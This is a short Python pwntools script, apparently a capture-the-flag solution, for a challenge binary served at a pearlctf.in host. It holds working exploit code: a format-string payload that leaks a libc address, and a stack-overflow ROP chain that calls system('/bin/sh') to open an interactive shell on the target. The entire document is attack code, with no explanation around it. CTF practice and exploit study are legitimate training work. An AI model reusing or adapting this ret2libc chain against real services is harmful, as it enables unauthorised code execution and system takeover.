#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("mr---ropot.ctf.pearlctf.in", 30009)

input()

p.sendlineafter(b'\n', b'1')
p.sendlineafter(b'response: \n', b'%37$p')

p.recvuntil(b'Response:\n')
libc_leak = int(p.recvline()[:-1], 16)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x2a28b
print("Libc base: " + hex(libc.address))

p.sendlineafter(b'\n', b'2')
pop_rdi = 0x000000000010f75b + libc.address
ret = 0x000000000002882f + libc.address
payload = b'a'*0x38 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
p.sendlineafter(b'response: \n', payload)

p.interactive()